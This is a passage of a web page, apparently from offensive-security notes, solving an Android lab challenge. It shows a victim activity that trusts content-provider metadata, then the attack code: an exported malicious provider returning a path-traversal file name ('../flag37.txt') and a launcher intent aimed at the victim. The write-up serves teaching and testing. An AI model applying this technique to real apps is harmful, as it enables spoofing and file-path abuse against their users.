+<div class="sourceCode" id="cb45"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb45-2"><a href="#cb45-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb45-3"><a href="#cb45-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb45-4"><a href="#cb45-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb45-5"><a href="#cb45-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb45-6"><a href="#cb45-6" aria-hidden="true" tabindex="-1"></a>        Uri data <span class="op">=</span> <span class="fu">getIntent</span><span class="op">().</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb45-7"><a href="#cb45-7" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Cursor</span> cursorQuery <span class="op">=</span> <span class="kw">null</span><span class="op">;</span></span>
+<span id="cb45-8"><a href="#cb45-8" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb45-9"><a href="#cb45-9" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb45-10"><a href="#cb45-10" aria-hidden="true" tabindex="-1"></a>                cursorQuery <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">query</span><span class="op">(</span>data<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">);</span></span>
+<span id="cb45-11"><a href="#cb45-11" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>cursorQuery <span class="op">!=</span> <span class="kw">null</span> <span class="op">&amp;&amp;</span> cursorQuery<span class="op">.</span><span class="fu">moveToFirst</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb45-12"><a href="#cb45-12" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">String</span> string <span class="op">=</span> cursorQuery<span class="op">.</span><span class="fu">getString</span><span class="op">(</span>cursorQuery<span class="op">.</span><span class="fu">getColumnIndex</span><span class="op">(</span><span class="st">&quot;_display_name&quot;</span><span class="op">));</span></span>
+<span id="cb45-13"><a href="#cb45-13" aria-hidden="true" tabindex="-1"></a>                    <span class="dt">long</span> j <span class="op">=</span> cursorQuery<span class="op">.</span><span class="fu">getLong</span><span class="op">(</span>cursorQuery<span class="op">.</span><span class="fu">getColumnIndex</span><span class="op">(</span><span class="st">&quot;_size&quot;</span><span class="op">));</span></span>
+<span id="cb45-14"><a href="#cb45-14" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> <span class="op">(</span><span class="st">&quot;../flag37.txt&quot;</span><span class="op">.</span><span class="fu">equals</span><span class="op">(</span>string<span class="op">)</span> <span class="op">&amp;&amp;</span> j <span class="op">==</span> <span class="dv">1337</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb45-15"><a href="#cb45-15" aria-hidden="true" tabindex="-1"></a>                        <span class="fu">success</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb45-16"><a href="#cb45-16" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span></span>
+<span id="cb45-17"><a href="#cb45-17" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb45-18"><a href="#cb45-18" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>cursorQuery <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb45-19"><a href="#cb45-19" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb45-20"><a href="#cb45-20" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb45-21"><a href="#cb45-21" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">Exception</span> e<span class="op">)</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb45-22"><a href="#cb45-22" aria-hidden="true" tabindex="-1"></a>            cursorQuery<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb45-23"><a href="#cb45-23" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">Throwable</span> th<span class="op">)</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb45-24"><a href="#cb45-24" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb45-25"><a href="#cb45-25" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>To trigger the <code>success()</code> method, we must control the data returned by the query. We need to serve a Cursor containing two columns (<code>_display_name</code> and <code>_size</code>) with the exact values <code>../flag37.txt</code> and <code>1337</code>. While we could implement a full SQLite database to back our Content Provider, it is much more efficient to use a <code>MatrixCursor</code>. A <code>MatrixCursor</code> allows us to create a dynamic, in-memory table without needing a database file.</p>
+<div class="sourceCode" id="cb46"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;utf-8&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb46-2"><a href="#cb46-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">manifest</span> <span class="er">...</span>&gt;</span>
+<span id="cb46-3"><a href="#cb46-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">application</span> <span class="er">...</span></span>
+<span id="cb46-4"><a href="#cb46-4" aria-hidden="true" tabindex="-1"></a>        <span class="er">&lt;</span><span class="ot">provider</span></span>
+<span id="cb46-5"><a href="#cb46-5" aria-hidden="true" tabindex="-1"></a>            <span class="er">android:name</span><span class="ot">=</span><span class="st">&quot;.AttackProvider&quot;</span></span>
+<span id="cb46-6"><a href="#cb46-6" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:authorities=</span><span class="st">&quot;com.example.myapplication.attack.provider&quot;</span></span>
+<span id="cb46-7"><a href="#cb46-7" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:enabled=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb46-8"><a href="#cb46-8" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:exported=</span><span class="st">&quot;true&quot;</span>&gt;&lt;/<span class="kw">provider</span>&gt;</span>
+<span id="cb46-9"><a href="#cb46-9" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">application</span>&gt;</span>
+<span id="cb46-10"><a href="#cb46-10" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>/manifest&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb47"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="kw">package</span><span class="im"> com</span><span class="op">.</span><span class="im">example</span><span class="op">.</span><span class="im">myapplication</span><span class="op">;</span></span>
+<span id="cb47-2"><a href="#cb47-2" aria-hidden="true" tabindex="-1"></a><span class="kw">...</span></span>
+<span id="cb47-3"><a href="#cb47-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb47-4"><a href="#cb47-4" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> AttackProvider <span class="kw">extends</span> ContentProvider <span class="op">{</span></span>
+<span id="cb47-5"><a href="#cb47-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">AttackProvider</span><span class="op">()</span> <span class="op">{}</span></span>
+<span id="cb47-6"><a href="#cb47-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb47-7"><a href="#cb47-7" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb47-8"><a href="#cb47-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="bu">Cursor</span> <span class="fu">query</span><span class="op">(</span>Uri uri<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> projection<span class="op">,</span> <span class="bu">String</span> selection<span class="op">,</span></span>
+<span id="cb47-9"><a href="#cb47-9" aria-hidden="true" tabindex="-1"></a>                        <span class="bu">String</span><span class="op">[]</span> selectionArgs<span class="op">,</span> <span class="bu">String</span> sortOrder<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb47-10"><a href="#cb47-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb47-11"><a href="#cb47-11" aria-hidden="true" tabindex="-1"></a>        MatrixCursor cursor <span class="op">=</span> <span class="kw">new</span> <span class="fu">MatrixCursor</span><span class="op">(</span><span class="kw">new</span> <span class="bu">String</span><span class="op">[]{</span><span class="st">&quot;_display_name&quot;</span><span class="op">,</span> <span class="st">&quot;_size&quot;</span><span class="op">});</span></span>
+<span id="cb47-12"><a href="#cb47-12" aria-hidden="true" tabindex="-1"></a>        cursor<span class="op">.</span><span class="fu">addRow</span><span class="op">(</span><span class="kw">new</span> <span class="bu">Object</span><span class="op">[]{</span><span class="st">&quot;../flag37.txt&quot;</span><span class="op">,</span> <span class="dv">1337</span><span class="op">});</span></span>
+<span id="cb47-13"><a href="#cb47-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb47-14"><a href="#cb47-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> cursor<span class="op">;</span></span>
+<span id="cb47-15"><a href="#cb47-15" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb47-16"><a href="#cb47-16" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb48"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity <span class="kw">extends</span> AppCompatActivity <span class="op">{</span></span>
+<span id="cb48-2"><a href="#cb48-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb48-3"><a href="#cb48-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb48-4"><a href="#cb48-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle savedInstanceState<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb48-5"><a href="#cb48-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span></span>
+<span id="cb48-6"><a href="#cb48-6" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb48-7"><a href="#cb48-7" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setClassName</span><span class="op">(</span><span class="st">&quot;io.test&quot;</span><span class="op">,</span> <span class="st">&quot;io.test.MainActivity&quot;</span><span class="op">);</span></span>
+<span id="cb48-8"><a href="#cb48-8" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Point the victim to our malicious provider</span></span>
+<span id="cb48-9"><a href="#cb48-9" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;content://com.example.myapplication.attack.provider/file.txt&quot;</span><span class="op">));</span></span>
+<span id="cb48-10"><a href="#cb48-10" aria-hidden="true" tabindex="-1"></a>        <span class="fu">startActivity</span><span class="op">(</span>intent<span class="op">);</span></span>
+<span id="cb48-11"><a href="#cb48-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb48-12"><a href="#cb48-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
